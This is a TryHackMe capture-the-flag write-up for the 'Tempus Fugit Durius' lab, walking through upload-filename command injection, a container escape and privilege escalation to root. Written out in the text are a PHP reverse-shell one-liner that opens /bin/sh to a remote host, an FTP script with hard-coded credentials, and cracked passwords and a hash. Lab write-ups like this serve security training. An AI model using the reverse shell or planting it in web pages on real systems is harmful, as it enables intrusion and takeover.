# Tempus Fugit Durius

## Overview
- Platform: TryHackMe
- Category: Web Exploitation / Linux Privilege Escalation
- Difficulty: Hard

## Key Techniques
- Filename-based command injection through upload functionality
- Reverse shell and container context validation
- SQL backup credential extraction and hash cracking
- SGID binary abuse and log-based final privilege escalation

---
Title: "Tempus_Fugit_Durius - TryHackMe Writeup"
Author: Cankun Wang
date: 2026-1-2
tags: [tryhackme, writeup]
---

# Task

Tempus Fugit is a Latin phrase that roughly translated as 鈥渢ime flies鈥?

Durius is also latin and means "harder".

This is a remake of Tempus Fugit 1. A bit harder and different from the first one.

It is an intermediate/hard, real life box.

# Enumeration

We start with taking a look at the target website.

![image-20260102143427709](./assets/image-20260102143427709.png)

![image-20260102143438847](./assets/image-20260102143438847.png)

![image-20260102143452994](./assets/image-20260102143452994.png)

![image-20260102143518800](./assets/image-20260102143518800.png)

![image-20260102143559389](./assets/image-20260102143559389.png)

This is a normal website and there is no explicit login page. However, there are some interesting points here.

First, the "about" part tells us that this site is used for uploading script and safe keep it on there 

internal FTP server.

Second, the "contact us" part, which is used for sending the form, respond us an error message.

These two may be our potentially path.

![image-20260102143925709](./assets/image-20260102143925709.png)

![image-20260102143938306](./assets/image-20260102143938306.png)

Besides, I noticed that the front end is using bootstrap, which may contain potential vulnerabilities.

## Scan

We start with nmap scanning.

![image-20260102144140565](./assets/image-20260102144140565.png)

We find two uncommon ports opened.

We proceed the enumeration and start directory search.

![image-20260102144809361](./assets/image-20260102144809361.png)

However, we find that the server will return 200 even the directory is not exist.

![image-20260102145259538](./assets/image-20260102145259538.png)

But I want to try to exclude the length 171 to see if we can ignore this.

![image-20260102145606741](./assets/image-20260102145606741.png)

It still not works. It verifies that this kind of wildcard will return random length. We may need to change our policy.

![image-20260102145838096](./assets/image-20260102145838096.png)

It is dynamic. Let's try ffuf or feroxbuster.

![image-20260102150045505](./assets/image-20260102150045505.png)

However, the results shows that everything at front end is returned 200.

![image-20260102150357730](./assets/image-20260102150357730.png)

It is strange, so I check some directories.

![image-20260102150424958](./assets/image-20260102150424958.png)

When I tried to access the file through the web, it returned a different 400 error message. 

![image-20260102150635485](./assets/image-20260102150635485.png)

Okay~~~ curl can't be used here. What if I tried to simulate a static asset request? (bypass the front end routing)

![image-20260102150834536](./assets/image-20260102150834536.png)

emmm... 锛氾級

It is not funny.

But it is clear now, let's focus on these uncommon ports.

## Enumeration part2

![image-20260102153449825](./assets/image-20260102153449825.png)

ssh and port 111 is opened.

Port 111's service is RPCbind, and port 42282 is running rpc service.

![image-20260102154059539](./assets/image-20260102154059539.png)

However, rpcinfo shows that there is nothing valuable running.

## Enumeration part3

![image-20260102154217129](./assets/image-20260102154217129.png)

When I come back to the site, I noticed the upload part and try to upload a txt file. 

![image-20260102160049058](./assets/image-20260102160049058.png)

![image-20260102155355126](./assets/image-20260102155355126.png)

The only allowed files are txt and rtf. The content of the file will show there. I test some payload and obviously nothing there. 

Let's start burp.

![image-20260102155614690](./assets/image-20260102155614690.png)

Let's see the response.

![image-20260102160153906](./assets/image-20260102160153906.png)

The response shows that this part is safe. So the only left thing is the file name. Remember the test file I upload is "test.php.txt" and there is no filename encode or validation.

Let's try this.

![image-20260102160625240](./assets/image-20260102160625240.png)

Bruh.... We are on the correct path.

It is returned 500 and an error message. This may because test is not a valid command.

![image-20260102160759573](./assets/image-20260102160759573.png)

This time I tried command "ls" and it returned.

![image-20260102160829106](./assets/image-20260102160829106.png)

We find the path. 

![image-20260102161220559](./assets/image-20260102161220559.png)

We are user www-data here.

## Reverse shell

So how could we get a reverse shell here.

![image-20260102161846671](./assets/image-20260102161846671.png)

I tried to use nc to start a shell.

![image-20260102161923667](./assets/image-20260102161923667.png)

But the file name has length limit,  we need to find a way to bypass this.

![image-20260102162511126](./assets/image-20260102162511126.png)

I convert the ip address to decimal to make the file name shorter.

![image-20260102163852438](./assets/image-20260102163852438.png)

![image-20260102163837683](./assets/image-20260102163837683.png)

Now we have a shell.

# Privilege Escalation
![image-20260102164328170](./assets/image-20260102164328170.png)

Some files here has root access and there are several interesting files. Let's first take a look at main.py.

![image-20260102164521155](./assets/image-20260102164521155.png)

At main.py, we find a user credential for FTP server.

The credential is "someuser" and the related password is here.

![image-20260102165216135](./assets/image-20260102165216135.png)

But we can't login to the ftp server, we don't have access.

![image-20260103153625026](./assets/image-20260103153625026.png)

I noticed that the target is not running ftp service. So we need to find a way to run the ftp.

But obviously we don't have the root privilege. 

We noticed that in main.py, there is not only the credential of ftp, it also provides the target ftp server. 

![image-20260103163105509](./assets/image-20260103163105509.png)

---

#!/usr/bin/python
from ftplib import FTP

ftp = FTP('ftp.mofo.pwn')
ftp.login('someuser', '04653cr37Passw0rdK06')
ftp.retrlines('LIST')

with open('creds.txt', 'wb') as fp:
    ftp.retrbinary('RETR creds.txt', fp.write)

ftp.quit()

---



So I used a python script, which acts as FTP client. Next we use wget on target machine to get this script and run it to get the file. (The first time I find the name of the file creds.txt, so I add with open to retrieve the file)

![image-20260103163253591](./assets/image-20260103163253591.png)

Now we have the credential.

---

admin:BAraTuwwWzx3gG

---

We are still not sure where this credential should be used, clearly not ssh.

## Escape container

Through ifconfig command, we make sure that we are currently in container.

![image-20260104095731803](./assets/image-20260104095731803.png)

We need some info about the container, so let's do a port forwarding.

The target doesn't have socat, and we can't ssh login. So using msf to do the port forwarding is a better choice.

First we need to start a reverse shell by meterpreter.

So using msfvenom to generate the payload, and then using msfconsole to start a general handler.(We use wget on target to get the payload)

![image-20260104132929475](./assets/image-20260104132929475.png)

![image-20260104133134821](./assets/image-20260104133134821.png)

![image-20260104133219433](./assets/image-20260104133219433.png)

I forgot the chmod.

Never mind, run the shell.elf on target machine.

However, we face a problem. 

![image-20260104143136962](./assets/image-20260104143136962.png)

Segmentation fault. This means we need a stageless payload.

![image-20260104143225361](./assets/image-20260104143225361.png)

![image-20260104143235239](./assets/image-20260104143235239.png)

Now we have the reverse shell.

Let's do the port forwarding.

![image-20260104150543145](./assets/image-20260104150543145.png)

After port forwarding, we find that the target site is the same with the original site. So we need to check all the subnets.

![image-20260104150631668](./assets/image-20260104150631668.png)

![image-20260105102113640](./assets/image-20260105102113640.png)

So first I forward the subnet 1 to local port 9000. 

And when we access the target through browser, it fails because it only allows the domain name, not the ip address input. So we need to edit the /etc/hosts file and correlate the localhost with the domain name.

Now we are able to access the subnets.

![image-20260105102617316](./assets/image-20260105102617316.png)

We already have the credential.

![image-20260105102707768](./assets/image-20260105102707768.png)

Now we can edit the php pages here, so what if we add a reverse shell in the php code?

But first we need to find a php page which is editable.

![image-20260105103136009](./assets/image-20260105103136009.png)

There are only two php pages which are editable. One is batblog and another is about me, so I choose to edit about me. I add a simple php reverse shell to the top of the file and wait for connection.

---

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![image-20260105104225704](./assets/image-20260105104225704.png)

Now it seems we have escape the container and get the real machine.

![image-20260105105107428](./assets/image-20260105105107428.png)

Again we first create a meterpreter session.

![image-20260105110923263](./assets/image-20260105110923263.png)

We choose to upload a script to check for any possible path for escalation privilege.

We have several findings.

![image-20260105112610018](./assets/image-20260105112610018.png)

First one is the important backup, which is a sql file and we have access to it.

![image-20260105112716890](./assets/image-20260105112716890.png)

![image-20260105112729101](./assets/image-20260105112729101.png)

Second is the binary. We can check it later.

![image-20260105112757380](./assets/image-20260105112757380.png)

And there are also cron jobs, and we can write path to it.

To completely check for all possible path, I also run the script linpeas.sh

![image-20260105122326415](./assets/image-20260105122326415.png)

Additional findings: sql file



### SQL backup

Let's first check this file.

![image-20260105113813682](./assets/image-20260105113813682.png)

We check for many keywords and base64 decode these. However, it seems these are only logs and records of the site. It doesn't contain valuable info.

### SQL file

Let's check the sql files here.

![image-20260105123253047](./assets/image-20260105123253047.png)

After I cd to the target directories, I found another sql file called database.sdb and clearly it is not empty.

![image-20260105123750577](./assets/image-20260105123750577.png)

We back to the meterpreter and download the file.

![image-20260105124212492](./assets/image-20260105124212492.png)

After viewing the file, we find another credential.

---

Name:Ben Clower

Hash: $2y$10$KSWWopGZdJhqP3iq8juuauMyNZjA8S8X/49lr7XntZKXsuWRUgaFC

---

Use john the ripper or hashcat to brute force it.

![image-20260105130701363](./assets/image-20260105130701363.png)

Now we have the credential.

![image-20260105130626371](./assets/image-20260105130626371.png)

---

Password:divisionminuscula

---

Now we have the flag1.

![image-20260105130933508](./assets/image-20260105130933508.png)

## Privilege Escalation Part 2
We run the lse.sh and linpeas.sh again.

There is some files with uncommon privilege.

![image-20260105132232547](./assets/image-20260105132232547.png)

First, the /usr/bin/at has SGID access.

Second, /usr/bin/crontab has SGID and we have the access to the crontab and write path right.

Third, the ispell is a highly possible way to escalate privilege.

### Crontab
![image-20260105132553369](./assets/image-20260105132553369.png)

There is no crontab job.

### Ispell
![image-20260105133254273](./assets/image-20260105133254273.png)

I try to use ispell to read some common files, and gladly we enter the interactive mode.

We can try to shell escape.

![image-20260105133612001](./assets/image-20260105133612001.png)

I tried bash first, but bash seems has safe check so we failed. But sh doesn't have the safe check, this time we success.

![image-20260105133915631](./assets/image-20260105133915631.png)

I first check the log and try to grep the "password". But unfortunately no valid credential find.

![image-20260105133951490](./assets/image-20260105133951490.png)

This time I try to grep "invalid user" to check if admin may make any mistakes when type in the username.

![image-20260105134029651](./assets/image-20260105134029651.png)

Gladly there is a valuable info. It is highly possible that admin makes a mistake when type in the username.

![image-20260105134205680](./assets/image-20260105134205680.png)

Correct! We are root now.

## Key Takeaways
- Enumeration depth was the key to uncovering the initial execution path.
- The path required chaining web exploitation, container context checks, and host escalation.
- Small privilege signals (SGID and logs) were critical for final root access.



